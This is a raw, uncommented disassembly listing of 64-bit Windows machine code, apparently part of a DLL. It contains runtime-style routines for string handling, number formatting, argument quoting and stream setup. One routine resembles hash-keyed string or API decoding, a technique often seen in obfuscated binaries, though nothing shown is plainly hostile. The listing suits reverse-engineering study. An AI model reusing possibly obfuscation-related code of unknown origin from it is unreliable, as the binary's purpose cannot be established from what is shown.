    69687e9b:	49 ff c0             	inc    %r8
    69687e9e:	eb e3                	jmp    0x69687e83
    69687ea0:	48 83 c4 28          	add    $0x28,%rsp
    69687ea4:	5b                   	pop    %rbx
    69687ea5:	5e                   	pop    %rsi
    69687ea6:	c3                   	ret
    69687ea7:	48 83 ec 28          	sub    $0x28,%rsp
    69687eab:	48 8d 0d 4e 6e 00 00 	lea    0x6e4e(%rip),%rcx        # 0x6968ed00
    69687eb2:	ba cc 5f ba 74       	mov    $0x74ba5fcc,%edx
    69687eb7:	e8 9d ff ff ff       	call   0x69687e59
    69687ebc:	48 89 c1             	mov    %rax,%rcx
    69687ebf:	e8 3a 9a ff ff       	call   0x696818fe
    69687ec4:	48 89 c1             	mov    %rax,%rcx
    69687ec7:	ff 15 1b d7 0f 00    	call   *0xfd71b(%rip)        # 0x697855e8
    69687ecd:	ba 24 ce 64 0d       	mov    $0xd64ce24,%edx
    69687ed2:	48 8d 0d e7 6d 00 00 	lea    0x6de7(%rip),%rcx        # 0x6968ecc0
    69687ed9:	48 89 05 c0 d3 0f 00 	mov    %rax,0xfd3c0(%rip)        # 0x697852a0
    69687ee0:	e8 74 ff ff ff       	call   0x69687e59
    69687ee5:	48 89 c1             	mov    %rax,%rcx
    69687ee8:	e8 11 9a ff ff       	call   0x696818fe
    69687eed:	48 8b 0d ac d3 0f 00 	mov    0xfd3ac(%rip),%rcx        # 0x697852a0
    69687ef4:	48 89 c2             	mov    %rax,%rdx
    69687ef7:	ff 15 23 48 10 00    	call   *0x104823(%rip)        # 0x6978c720
    69687efd:	48 89 05 cc 46 10 00 	mov    %rax,0x1046cc(%rip)        # 0x6978c5d0
    69687f04:	48 89 05 5d d2 0f 00 	mov    %rax,0xfd25d(%rip)        # 0x69785168
    69687f0b:	48 83 c4 28          	add    $0x28,%rsp
    69687f0f:	c3                   	ret
    69687f10:	41 55                	push   %r13
    69687f12:	41 54                	push   %r12
    69687f14:	55                   	push   %rbp
    69687f15:	57                   	push   %rdi
    69687f16:	56                   	push   %rsi
    69687f17:	53                   	push   %rbx
    69687f18:	48 83 ec 28          	sub    $0x28,%rsp
    69687f1c:	41 bc 00 00 00 00    	mov    $0x0,%r12d
    69687f22:	48 85 d2             	test   %rdx,%rdx
    69687f25:	48 89 cb             	mov    %rcx,%rbx
    69687f28:	48 89 d5             	mov    %rdx,%rbp
    69687f2b:	4c 0f 49 e2          	cmovns %rdx,%r12
    69687f2f:	48 85 c9             	test   %rcx,%rcx
    69687f32:	74 60                	je     0x69687f94
    69687f34:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
    69687f3b:	ff ff 3f 
    69687f3e:	48 23 4b 08          	and    0x8(%rbx),%rcx
    69687f42:	4c 39 e1             	cmp    %r12,%rcx
    69687f45:	7d 58                	jge    0x69687f9f
    69687f47:	e8 cc 99 ff ff       	call   0x69681918
    69687f4c:	48 8d 73 10          	lea    0x10(%rbx),%rsi
    69687f50:	48 39 c5             	cmp    %rax,%rbp
    69687f53:	48 0f 4d c5          	cmovge %rbp,%rax
    69687f57:	48 89 c1             	mov    %rax,%rcx
    69687f5a:	49 89 c5             	mov    %rax,%r13
    69687f5d:	e8 ce f8 ff ff       	call   0x69687830
    69687f62:	48 8b 0b             	mov    (%rbx),%rcx
    69687f65:	48 89 ea             	mov    %rbp,%rdx
    69687f68:	49 89 c1             	mov    %rax,%r9
    69687f6b:	48 8d 40 10          	lea    0x10(%rax),%rax
    69687f6f:	48 89 48 f0          	mov    %rcx,-0x10(%rax)
    69687f73:	48 89 c7             	mov    %rax,%rdi
    69687f76:	48 ff c1             	inc    %rcx
    69687f79:	f3 a4                	rep movsb (%rsi),(%rdi)
    69687f7b:	48 8b 03             	mov    (%rbx),%rax
    69687f7e:	49 8d 4c 01 10       	lea    0x10(%r9,%rax,1),%rcx
    69687f83:	48 29 c2             	sub    %rax,%rdx
    69687f86:	e8 41 9a ff ff       	call   0x696819cc
    69687f8b:	4d 89 69 08          	mov    %r13,0x8(%r9)
    69687f8f:	4c 89 cb             	mov    %r9,%rbx
    69687f92:	eb 0b                	jmp    0x69687f9f
    69687f94:	48 89 d1             	mov    %rdx,%rcx
    69687f97:	e8 3e f7 ff ff       	call   0x696876da
    69687f9c:	48 89 c3             	mov    %rax,%rbx
    69687f9f:	48 89 d8             	mov    %rbx,%rax
    69687fa2:	4c 89 23             	mov    %r12,(%rbx)
    69687fa5:	42 c6 44 23 10 00    	movb   $0x0,0x10(%rbx,%r12,1)
    69687fab:	48 83 c4 28          	add    $0x28,%rsp
    69687faf:	5b                   	pop    %rbx
    69687fb0:	5e                   	pop    %rsi
    69687fb1:	5f                   	pop    %rdi
    69687fb2:	5d                   	pop    %rbp
    69687fb3:	41 5c                	pop    %r12
    69687fb5:	41 5d                	pop    %r13
    69687fb7:	c3                   	ret
    69687fb8:	55                   	push   %rbp
    69687fb9:	57                   	push   %rdi
    69687fba:	56                   	push   %rsi
    69687fbb:	53                   	push   %rbx
    69687fbc:	48 83 ec 48          	sub    $0x48,%rsp
    69687fc0:	bb 17 00 00 00       	mov    $0x17,%ebx
    69687fc5:	41 b8 64 00 00 00    	mov    $0x64,%r8d
    69687fcb:	4c 8d 4c 24 27       	lea    0x27(%rsp),%r9
    69687fd0:	48 89 ce             	mov    %rcx,%rsi
    69687fd3:	48 89 d0             	mov    %rdx,%rax
    69687fd6:	48 8d 0d 03 67 00 00 	lea    0x6703(%rip),%rcx        # 0x6968e6e0
    69687fdd:	48 83 f8 63          	cmp    $0x63,%rax
    69687fe1:	77 20                	ja     0x69688003
    69687fe3:	48 83 f8 09          	cmp    $0x9,%rax
    69687fe7:	76 39                	jbe    0x69688022
    69687fe9:	48 8d 15 f0 66 00 00 	lea    0x66f0(%rip),%rdx        # 0x6968e6e0
    69687ff0:	48 01 c0             	add    %rax,%rax
    69687ff3:	8a 4c 02 01          	mov    0x1(%rdx,%rax,1),%cl
    69687ff7:	8a 04 02             	mov    (%rdx,%rax,1),%al
    69687ffa:	88 4c 1c 28          	mov    %cl,0x28(%rsp,%rbx,1)
    69687ffe:	48 ff cb             	dec    %rbx
    69688001:	eb 22                	jmp    0x69688025
    69688003:	31 d2                	xor    %edx,%edx
    69688005:	49 f7 f0             	div    %r8
    69688008:	48 01 d2             	add    %rdx,%rdx
    6968800b:	44 8a 54 11 01       	mov    0x1(%rcx,%rdx,1),%r10b
    69688010:	8a 14 11             	mov    (%rcx,%rdx,1),%dl
    69688013:	44 88 54 1c 28       	mov    %r10b,0x28(%rsp,%rbx,1)
    69688018:	41 88 14 19          	mov    %dl,(%r9,%rbx,1)
    6968801c:	48 83 eb 02          	sub    $0x2,%rbx
    69688020:	eb bb                	jmp    0x69687fdd
    69688022:	83 c0 30             	add    $0x30,%eax
    69688025:	b9 18 00 00 00       	mov    $0x18,%ecx
    6968802a:	31 ed                	xor    %ebp,%ebp
    6968802c:	88 44 1c 28          	mov    %al,0x28(%rsp,%rbx,1)
    69688030:	48 89 cf             	mov    %rcx,%rdi
    69688033:	48 8b 0e             	mov    (%rsi),%rcx
    69688036:	48 29 df             	sub    %rbx,%rdi
    69688039:	48 85 c9             	test   %rcx,%rcx
    6968803c:	74 03                	je     0x69688041
    6968803e:	48 8b 29             	mov    (%rcx),%rbp
    69688041:	48 8d 14 2f          	lea    (%rdi,%rbp,1),%rdx
    69688045:	e8 c6 fe ff ff       	call   0x69687f10
    6968804a:	48 89 f1             	mov    %rsi,%rcx
    6968804d:	48 89 c2             	mov    %rax,%rdx
    69688050:	e8 d0 e3 ff ff       	call   0x69686425
    69688055:	48 8b 06             	mov    (%rsi),%rax
    69688058:	48 8d 74 1c 28       	lea    0x28(%rsp,%rbx,1),%rsi
    6968805d:	89 f9                	mov    %edi,%ecx
    6968805f:	48 8d 44 28 10       	lea    0x10(%rax,%rbp,1),%rax
    69688064:	48 89 c7             	mov    %rax,%rdi
    69688067:	f3 a4                	rep movsb (%rsi),(%rdi)
    69688069:	48 83 c4 48          	add    $0x48,%rsp
    6968806d:	5b                   	pop    %rbx
    6968806e:	5e                   	pop    %rsi
    6968806f:	5f                   	pop    %rdi
    69688070:	5d                   	pop    %rbp
    69688071:	c3                   	ret
    69688072:	55                   	push   %rbp
    69688073:	57                   	push   %rdi
    69688074:	56                   	push   %rsi
    69688075:	53                   	push   %rbx
    69688076:	48 83 ec 28          	sub    $0x28,%rsp
    6968807a:	48 85 c9             	test   %rcx,%rcx
    6968807d:	48 89 ce             	mov    %rcx,%rsi
    69688080:	89 d3                	mov    %edx,%ebx
    69688082:	74 43                	je     0x696880c7
    69688084:	48 b9 ff ff ff ff ff 	movabs $0x3fffffffffffffff,%rcx
    6968808b:	ff ff 3f 
    6968808e:	48 23 4e 08          	and    0x8(%rsi),%rcx
    69688092:	48 3b 0e             	cmp    (%rsi),%rcx
    69688095:	7f 44                	jg     0x696880db
    69688097:	e8 7c 98 ff ff       	call   0x69681918
    6968809c:	48 83 c6 10          	add    $0x10,%rsi
    696880a0:	48 89 c1             	mov    %rax,%rcx
    696880a3:	48 89 c5             	mov    %rax,%rbp
    696880a6:	e8 85 f7 ff ff       	call   0x69687830
    696880ab:	48 8b 4e f0          	mov    -0x10(%rsi),%rcx
    696880af:	48 8d 50 10          	lea    0x10(%rax),%rdx
    696880b3:	48 89 d7             	mov    %rdx,%rdi
    696880b6:	48 89 08             	mov    %rcx,(%rax)
    696880b9:	48 ff c1             	inc    %rcx
    696880bc:	f3 a4                	rep movsb (%rsi),(%rdi)
    696880be:	48 89 68 08          	mov    %rbp,0x8(%rax)
    696880c2:	48 89 c6             	mov    %rax,%rsi
    696880c5:	eb 14                	jmp    0x696880db
    696880c7:	b9 01 00 00 00       	mov    $0x1,%ecx
    696880cc:	e8 5f f7 ff ff       	call   0x69687830
    696880d1:	48 89 c6             	mov    %rax,%rsi
    696880d4:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    696880db:	48 8b 06             	mov    (%rsi),%rax
    696880de:	88 5c 06 10          	mov    %bl,0x10(%rsi,%rax,1)
    696880e2:	c6 44 06 11 00       	movb   $0x0,0x11(%rsi,%rax,1)
    696880e7:	48 ff c0             	inc    %rax
    696880ea:	48 89 06             	mov    %rax,(%rsi)
    696880ed:	48 89 f0             	mov    %rsi,%rax
    696880f0:	48 83 c4 28          	add    $0x28,%rsp
    696880f4:	5b                   	pop    %rbx
    696880f5:	5e                   	pop    %rsi
    696880f6:	5f                   	pop    %rdi
    696880f7:	5d                   	pop    %rbp
    696880f8:	c3                   	ret
    696880f9:	41 57                	push   %r15
    696880fb:	41 56                	push   %r14
    696880fd:	41 55                	push   %r13
    696880ff:	41 54                	push   %r12
    69688101:	55                   	push   %rbp
    69688102:	57                   	push   %rdi
    69688103:	56                   	push   %rsi
    69688104:	53                   	push   %rbx
    69688105:	48 83 ec 38          	sub    $0x38,%rsp
    69688109:	48 8d 15 50 6b 00 00 	lea    0x6b50(%rip),%rdx        # 0x6968ec60
    69688110:	48 89 cf             	mov    %rcx,%rdi
    69688113:	e8 bf bc ff ff       	call   0x69683dd7
    69688118:	84 c0                	test   %al,%al
    6968811a:	89 c5                	mov    %eax,%ebp
    6968811c:	75 0d                	jne    0x6968812b
    6968811e:	48 85 c9             	test   %rcx,%rcx
    69688121:	74 08                	je     0x6968812b
    69688123:	31 db                	xor    %ebx,%ebx
    69688125:	48 83 39 00          	cmpq   $0x0,(%rcx)
    69688129:	75 27                	jne    0x69688152
    6968812b:	b9 01 00 00 00       	mov    $0x1,%ecx
    69688130:	45 31 f6             	xor    %r14d,%r14d
    69688133:	40 b5 01             	mov    $0x1,%bpl
    69688136:	e8 f5 f6 ff ff       	call   0x69687830
    6968813b:	48 8d 15 ee 6a 00 00 	lea    0x6aee(%rip),%rdx        # 0x6968ec30
    69688142:	48 89 c1             	mov    %rax,%rcx
    69688145:	48 89 c3             	mov    %rax,%rbx
    69688148:	e8 2b 98 ff ff       	call   0x69681978
    6968814d:	48 85 ff             	test   %rdi,%rdi
    69688150:	74 03                	je     0x69688155
    69688152:	4c 8b 37             	mov    (%rdi),%r14
    69688155:	4c 8d 3d b4 6a 00 00 	lea    0x6ab4(%rip),%r15        # 0x6968ec10
    6968815c:	45 31 ed             	xor    %r13d,%r13d
    6968815f:	31 f6                	xor    %esi,%esi
    69688161:	4d 39 f5             	cmp    %r14,%r13
    69688164:	7c 0e                	jl     0x69688174
    69688166:	48 85 f6             	test   %rsi,%rsi
    69688169:	0f 85 d3 00 00 00    	jne    0x69688242
    6968816f:	e9 ee 00 00 00       	jmp    0x69688262
    69688174:	46 8a 64 2f 10       	mov    0x10(%rdi,%r13,1),%r12b
    69688179:	41 80 fc 5c          	cmp    $0x5c,%r12b
    6968817d:	74 08                	je     0x69688187
    6968817f:	41 80 fc 22          	cmp    $0x22,%r12b
    69688183:	75 17                	jne    0x6968819c
    69688185:	eb 1f                	jmp    0x696881a6
    69688187:	48 89 f1             	mov    %rsi,%rcx
    6968818a:	ba 5c 00 00 00       	mov    $0x5c,%edx
    6968818f:	e8 de fe ff ff       	call   0x69688072
    69688194:	48 89 c6             	mov    %rax,%rsi
    69688197:	e9 9e 00 00 00       	jmp    0x6968823a
    6968819c:	48 85 f6             	test   %rsi,%rsi
    6968819f:	75 5f                	jne    0x69688200
    696881a1:	e9 85 00 00 00       	jmp    0x6968822b
    696881a6:	48 85 f6             	test   %rsi,%rsi
    696881a9:	74 16                	je     0x696881c1
    696881ab:	4c 8b 26             	mov    (%rsi),%r12
    696881ae:	4b 8d 04 24          	lea    (%r12,%r12,1),%rax
    696881b2:	45 31 e4             	xor    %r12d,%r12d
    696881b5:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    696881ba:	4c 3b 64 24 28       	cmp    0x28(%rsp),%r12
    696881bf:	7c 2a                	jl     0x696881eb
    696881c1:	31 d2                	xor    %edx,%edx
    696881c3:	48 89 f1             	mov    %rsi,%rcx
    696881c6:	e8 45 fd ff ff       	call   0x69687f10
    696881cb:	48 89 d9             	mov    %rbx,%rcx
    696881ce:	ba 02 00 00 00       	mov    $0x2,%edx
    696881d3:	48 89 c6             	mov    %rax,%rsi
    696881d6:	e8 88 f6 ff ff       	call   0x69687863
    696881db:	4c 89 fa             	mov    %r15,%rdx
    696881de:	48 89 c1             	mov    %rax,%rcx
    696881e1:	48 89 c3             	mov    %rax,%rbx
    696881e4:	e8 8f 97 ff ff       	call   0x69681978
    696881e9:	eb 4f                	jmp    0x6968823a
    696881eb:	48 89 d9             	mov    %rbx,%rcx
    696881ee:	ba 5c 00 00 00       	mov    $0x5c,%edx
    696881f3:	49 ff c4             	inc    %r12
    696881f6:	e8 77 fe ff ff       	call   0x69688072
    696881fb:	48 89 c3             	mov    %rax,%rbx
    696881fe:	eb ba                	jmp    0x696881ba
    69688200:	48 8b 16             	mov    (%rsi),%rdx
    69688203:	48 85 d2             	test   %rdx,%rdx
    69688206:	74 23                	je     0x6968822b
    69688208:	48 89 d9             	mov    %rbx,%rcx
    6968820b:	e8 53 f6 ff ff       	call   0x69687863
    69688210:	48 89 f2             	mov    %rsi,%rdx
    69688213:	48 89 c1             	mov    %rax,%rcx
    69688216:	48 89 c3             	mov    %rax,%rbx
    69688219:	e8 80 97 ff ff       	call   0x6968199e
    6968821e:	48 89 f1             	mov    %rsi,%rcx
    69688221:	31 d2                	xor    %edx,%edx
    69688223:	e8 e8 fc ff ff       	call   0x69687f10
    69688228:	48 89 c6             	mov    %rax,%rsi
    6968822b:	48 89 d9             	mov    %rbx,%rcx
    6968822e:	41 0f be d4          	movsbl %r12b,%edx
    69688232:	e8 3b fe ff ff       	call   0x69688072
    69688237:	48 89 c3             	mov    %rax,%rbx
    6968823a:	49 ff c5             	inc    %r13
    6968823d:	e9 1f ff ff ff       	jmp    0x69688161
    69688242:	48 8b 16             	mov    (%rsi),%rdx
    69688245:	48 85 d2             	test   %rdx,%rdx
    69688248:	7e 56                	jle    0x696882a0
    6968824a:	48 89 d9             	mov    %rbx,%rcx
    6968824d:	e8 11 f6 ff ff       	call   0x69687863
    69688252:	48 89 f2             	mov    %rsi,%rdx
    69688255:	48 89 c1             	mov    %rax,%rcx
    69688258:	48 89 c3             	mov    %rax,%rbx
    6968825b:	e8 3e 97 ff ff       	call   0x6968199e
    69688260:	eb 3e                	jmp    0x696882a0
    69688262:	31 d2                	xor    %edx,%edx
    69688264:	40 84 ed             	test   %bpl,%bpl
    69688267:	74 41                	je     0x696882aa
    69688269:	48 89 d9             	mov    %rbx,%rcx
    6968826c:	e8 f2 f5 ff ff       	call   0x69687863
    69688271:	48 89 f2             	mov    %rsi,%rdx
    69688274:	48 89 c1             	mov    %rax,%rcx
    69688277:	49 89 c1             	mov    %rax,%r9
    6968827a:	e8 1f 97 ff ff       	call   0x6968199e
    6968827f:	ba 01 00 00 00       	mov    $0x1,%edx
    69688284:	4c 89 c9             	mov    %r9,%rcx
    69688287:	e8 d7 f5 ff ff       	call   0x69687863
    6968828c:	48 8d 15 9d 69 00 00 	lea    0x699d(%rip),%rdx        # 0x6968ec30
    69688293:	48 89 c1             	mov    %rax,%rcx
    69688296:	48 89 c3             	mov    %rax,%rbx
    69688299:	e8 da 96 ff ff       	call   0x69681978
    6968829e:	eb 0a                	jmp    0x696882aa
    696882a0:	40 84 ed             	test   %bpl,%bpl
    696882a3:	74 05                	je     0x696882aa
    696882a5:	48 8b 16             	mov    (%rsi),%rdx
    696882a8:	eb bf                	jmp    0x69688269
    696882aa:	48 89 d8             	mov    %rbx,%rax
    696882ad:	48 83 c4 38          	add    $0x38,%rsp
    696882b1:	5b                   	pop    %rbx
    696882b2:	5e                   	pop    %rsi
    696882b3:	5f                   	pop    %rdi
    696882b4:	5d                   	pop    %rbp
    696882b5:	41 5c                	pop    %r12
    696882b7:	41 5d                	pop    %r13
    696882b9:	41 5e                	pop    %r14
    696882bb:	41 5f                	pop    %r15
    696882bd:	c3                   	ret
    696882be:	e9 36 fe ff ff       	jmp    0x696880f9
    696882c3:	41 54                	push   %r12
    696882c5:	55                   	push   %rbp
    696882c6:	57                   	push   %rdi
    696882c7:	56                   	push   %rsi
    696882c8:	53                   	push   %rbx
    696882c9:	48 83 ec 30          	sub    $0x30,%rsp
    696882cd:	31 db                	xor    %ebx,%ebx
    696882cf:	48 89 d5             	mov    %rdx,%rbp
    696882d2:	4d 89 c4             	mov    %r8,%r12
    696882d5:	e8 1f fe ff ff       	call   0x696880f9
    696882da:	4c 39 e3             	cmp    %r12,%rbx
    696882dd:	7d 49                	jge    0x69688328
    696882df:	ba 20 00 00 00       	mov    $0x20,%edx
    696882e4:	48 89 c1             	mov    %rax,%rcx
    696882e7:	e8 86 fd ff ff       	call   0x69688072
    696882ec:	48 8b 4c dd 00       	mov    0x0(%rbp,%rbx,8),%rcx
    696882f1:	48 89 c7             	mov    %rax,%rdi
    696882f4:	e8 00 fe ff ff       	call   0x696880f9
    696882f9:	31 d2                	xor    %edx,%edx
    696882fb:	48 85 c0             	test   %rax,%rax
    696882fe:	48 89 c6             	mov    %rax,%rsi
    69688301:	74 03                	je     0x69688306
    69688303:	48 8b 10             	mov    (%rax),%rdx
    69688306:	48 89 f9             	mov    %rdi,%rcx
    69688309:	48 ff c3             	inc    %rbx
    6968830c:	e8 52 f5 ff ff       	call   0x69687863
    69688311:	48 89 f2             	mov    %rsi,%rdx
    69688314:	48 89 c1             	mov    %rax,%rcx
    69688317:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6968831c:	e8 7d 96 ff ff       	call   0x6968199e
    69688321:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
    69688326:	eb b2                	jmp    0x696882da
    69688328:	48 83 c4 30          	add    $0x30,%rsp
    6968832c:	5b                   	pop    %rbx
    6968832d:	5e                   	pop    %rsi
    6968832e:	5f                   	pop    %rdi
    6968832f:	5d                   	pop    %rbp
    69688330:	41 5c                	pop    %r12
    69688332:	c3                   	ret
    69688333:	56                   	push   %rsi
    69688334:	53                   	push   %rbx
    69688335:	48 83 ec 28          	sub    $0x28,%rsp
    69688339:	48 85 d2             	test   %rdx,%rdx
    6968833c:	48 89 ce             	mov    %rcx,%rsi
    6968833f:	74 23                	je     0x69688364
    69688341:	48 89 d3             	mov    %rdx,%rbx
    69688344:	48 ff c3             	inc    %rbx
    69688347:	0f be 53 ff          	movsbl -0x1(%rbx),%edx
    6968834b:	84 d2                	test   %dl,%dl
    6968834d:	74 15                	je     0x69688364
    6968834f:	48 8b 0e             	mov    (%rsi),%rcx
    69688352:	e8 1b fd ff ff       	call   0x69688072
    69688357:	48 89 f1             	mov    %rsi,%rcx
    6968835a:	48 89 c2             	mov    %rax,%rdx
    6968835d:	e8 c3 e0 ff ff       	call   0x69686425
    69688362:	eb e0                	jmp    0x69688344
    69688364:	48 83 c4 28          	add    $0x28,%rsp
    69688368:	5b                   	pop    %rbx
    69688369:	5e                   	pop    %rsi
    6968836a:	c3                   	ret
    6968836b:	57                   	push   %rdi
    6968836c:	56                   	push   %rsi
    6968836d:	53                   	push   %rbx
    6968836e:	48 83 ec 20          	sub    $0x20,%rsp
    69688372:	48 89 ce             	mov    %rcx,%rsi
    69688375:	48 89 d1             	mov    %rdx,%rcx
    69688378:	48 89 d3             	mov    %rdx,%rbx
    6968837b:	e8 b0 f4 ff ff       	call   0x69687830
    69688380:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
    69688384:	48 8d 50 10          	lea    0x10(%rax),%rdx
    69688388:	48 89 18             	mov    %rbx,(%rax)
    6968838b:	48 89 d7             	mov    %rdx,%rdi
    6968838e:	f3 a4                	rep movsb (%rsi),(%rdi)
    69688390:	48 83 c4 20          	add    $0x20,%rsp
    69688394:	5b                   	pop    %rbx
    69688395:	5e                   	pop    %rsi
    69688396:	5f                   	pop    %rdi
    69688397:	c3                   	ret
    69688398:	57                   	push   %rdi
    69688399:	48 85 c9             	test   %rcx,%rcx
    6968839c:	49 89 c8             	mov    %rcx,%r8
    6968839f:	74 1b                	je     0x696883bc
    696883a1:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    696883a5:	31 c0                	xor    %eax,%eax
    696883a7:	4c 89 c7             	mov    %r8,%rdi
    696883aa:	f2 ae                	repnz scas (%rdi),%al
    696883ac:	48 89 ca             	mov    %rcx,%rdx
    696883af:	4c 89 c1             	mov    %r8,%rcx
    696883b2:	48 f7 d2             	not    %rdx
    696883b5:	48 8d 52 ff          	lea    -0x1(%rdx),%rdx
    696883b9:	5f                   	pop    %rdi
    696883ba:	eb af                	jmp    0x6968836b
    696883bc:	31 c0                	xor    %eax,%eax
    696883be:	5f                   	pop    %rdi
    696883bf:	c3                   	ret
    696883c0:	53                   	push   %rbx
    696883c1:	48 83 ec 20          	sub    $0x20,%rsp
    696883c5:	48 89 cb             	mov    %rcx,%rbx
    696883c8:	48 89 51 08          	mov    %rdx,0x8(%rcx)
    696883cc:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
    696883d3:	48 8d 0c d5 00 00 00 	lea    0x0(,%rdx,8),%rcx
    696883da:	00 
    696883db:	e8 d8 e1 ff ff       	call   0x696865b8
    696883e0:	48 89 43 10          	mov    %rax,0x10(%rbx)
    696883e4:	48 83 c4 20          	add    $0x20,%rsp
    696883e8:	5b                   	pop    %rbx
    696883e9:	c3                   	ret
    696883ea:	48 83 ec 28          	sub    $0x28,%rsp
    696883ee:	48 8d 0d 23 96 0f 00 	lea    0xf9623(%rip),%rcx        # 0x69781a18
    696883f5:	ba 00 04 00 00       	mov    $0x400,%edx
    696883fa:	48 c7 05 03 96 0f 00 	movq   $0x400000,0xf9603(%rip)        # 0x69781a08
    69688401:	00 00 40 00 
    69688405:	48 c7 05 00 96 0f 00 	movq   $0x1f4,0xf9600(%rip)        # 0x69781a10
    6968840c:	f4 01 00 00 
    69688410:	48 c7 05 3d c1 0f 00 	movq   $0x0,0xfc13d(%rip)        # 0x69784558
    69688417:	00 00 00 00 
    6968841b:	48 c7 05 3a c1 0f 00 	movq   $0x0,0xfc13a(%rip)        # 0x69784560
    69688422:	00 00 00 00 
    69688426:	48 c7 05 37 c1 0f 00 	movq   $0x0,0xfc137(%rip)        # 0x69784568
    6968842d:	00 00 00 00 
    69688431:	48 c7 05 34 c1 0f 00 	movq   $0x0,0xfc134(%rip)        # 0x69784570
    69688438:	00 00 00 00 
    6968843c:	48 c7 05 31 c1 0f 00 	movq   $0x0,0xfc131(%rip)        # 0x69784578
    69688443:	00 00 00 00 
    69688447:	48 c7 05 2e c1 0f 00 	movq   $0x0,0xfc12e(%rip)        # 0x69784580
    6968844e:	00 00 00 00 
    69688452:	e8 69 ff ff ff       	call   0x696883c0
    69688457:	ba 00 04 00 00       	mov    $0x400,%edx
    6968845c:	48 8d 0d e5 95 0f 00 	lea    0xf95e5(%rip),%rcx        # 0x69781a48
    69688463:	e8 58 ff ff ff       	call   0x696883c0
    69688468:	ba 00 04 00 00       	mov    $0x400,%edx
    6968846d:	48 8d 0d bc 95 0f 00 	lea    0xf95bc(%rip),%rcx        # 0x69781a30
    69688474:	e8 47 ff ff ff       	call   0x696883c0
    69688479:	48 8d 0d 10 c1 0f 00 	lea    0xfc110(%rip),%rcx        # 0x69784590
    69688480:	e8 3a ea ff ff       	call   0x69686ebf
    69688485:	ba 00 04 00 00       	mov    $0x400,%edx
    6968848a:	48 8d 0d 1f c1 0f 00 	lea    0xfc11f(%rip),%rcx        # 0x697845b0
    69688491:	e8 2a ff ff ff       	call   0x696883c0
    69688496:	48 8b 05 4b 41 10 00 	mov    0x10414b(%rip),%rax        # 0x6978c5e8
    6968849d:	48 8d 50 01          	lea    0x1(%rax),%rdx
    696884a1:	48 89 05 20 c1 0f 00 	mov    %rax,0xfc120(%rip)        # 0x697845c8
    696884a8:	48 89 15 39 41 10 00 	mov    %rdx,0x104139(%rip)        # 0x6978c5e8
    696884af:	48 83 c4 28          	add    $0x28,%rsp
    696884b3:	c3                   	ret
    696884b4:	48 8b 05 45 95 0f 00 	mov    0xf9545(%rip),%rax        # 0x69781a00
    696884bb:	48 85 c0             	test   %rax,%rax
    696884be:	74 0c                	je     0x696884cc
    696884c0:	48 39 c8             	cmp    %rcx,%rax
    696884c3:	74 0e                	je     0x696884d3
    696884c5:	48 39 c1             	cmp    %rax,%rcx
    696884c8:	48 0f 4c c8          	cmovl  %rax,%rcx
    696884cc:	48 89 0d 2d 95 0f 00 	mov    %rcx,0xf952d(%rip)        # 0x69781a00
    696884d3:	c3                   	ret
    696884d4:	48 83 ec 38          	sub    $0x38,%rsp
    696884d8:	48 8d 0d 10 e7 ff ff 	lea    -0x18f0(%rip),%rcx        # 0x69686bef
    696884df:	e8 46 ca ff ff       	call   0x69684f2a
    696884e4:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
    696884e9:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    696884ee:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
    696884f3:	e8 bc ff ff ff       	call   0x696884b4
    696884f8:	e8 ed fe ff ff       	call   0x696883ea
    696884fd:	e8 a0 c8 ff ff       	call   0x69684da2
    69688502:	90                   	nop
    69688503:	48 83 c4 38          	add    $0x38,%rsp
    69688507:	c3                   	ret
    69688508:	48 c7 05 25 24 0f 00 	movq   $0x0,0xf2425(%rip)        # 0x6977a938
    6968850f:	00 00 00 00 
    69688513:	48 c7 05 02 24 0f 00 	movq   $0x4,0xf2402(%rip)        # 0x6977a920
    6968851a:	04 00 00 00 
    6968851e:	48 c7 05 ff 23 0f 00 	movq   $0x4,0xf23ff(%rip)        # 0x6977a928
    69688525:	04 00 00 00 
    69688529:	66 c7 05 fe 23 0f 00 	movw   $0x322,0xf23fe(%rip)        # 0x6977a930
    69688530:	22 03 
    69688532:	c3                   	ret
    69688533:	57                   	push   %rdi
    69688534:	56                   	push   %rsi
    69688535:	53                   	push   %rbx
    69688536:	48 83 ec 20          	sub    $0x20,%rsp
    6968853a:	48 8b 3d af 4b 00 00 	mov    0x4baf(%rip),%rdi        # 0x6968d0f0
    69688541:	31 c9                	xor    %ecx,%ecx
    69688543:	ff d7                	call   *%rdi
    69688545:	48 8b 35 88 5d 10 00 	mov    0x105d88(%rip),%rsi        # 0x6978e2d4
    6968854c:	48 89 c1             	mov    %rax,%rcx
    6968854f:	ff d6                	call   *%rsi
    69688551:	ba 00 80 00 00       	mov    $0x8000,%edx
    69688556:	48 8b 1d 97 5d 10 00 	mov    0x105d97(%rip),%rbx        # 0x6978e2f4
    6968855d:	89 c1                	mov    %eax,%ecx
    6968855f:	ff d3                	call   *%rbx
    69688561:	b9 01 00 00 00       	mov    $0x1,%ecx
    69688566:	ff d7                	call   *%rdi
    69688568:	48 89 c1             	mov    %rax,%rcx
    6968856b:	ff d6                	call   *%rsi
    6968856d:	ba 00 80 00 00       	mov    $0x8000,%edx
    69688572:	89 c1                	mov    %eax,%ecx
    69688574:	ff d3                	call   *%rbx
    69688576:	b9 02 00 00 00       	mov    $0x2,%ecx
    6968857b:	ff d7                	call   *%rdi
    6968857d:	48 89 c1             	mov    %rax,%rcx
    69688580:	ff d6                	call   *%rsi
    69688582:	ba 00 80 00 00       	mov    $0x8000,%edx
    69688587:	89 c1                	mov    %eax,%ecx
    69688589:	48 89 d8             	mov    %rbx,%rax
    6968858c:	48 83 c4 20          	add    $0x20,%rsp
    69688590:	5b                   	pop    %rbx
    69688591:	5e                   	pop    %rsi
    69688592:	5f                   	pop    %rdi
    69688593:	48 ff e0             	rex.W jmp *%rax
    69688596:	48 83 ec 28          	sub    $0x28,%rsp
    6968859a:	e8 94 ff ff ff       	call   0x69688533
    6968859f:	e8 33 a8 ff ff       	call   0x69682dd7
    696885a4:	e8 e4 c9 ff ff       	call   0x69684f8d
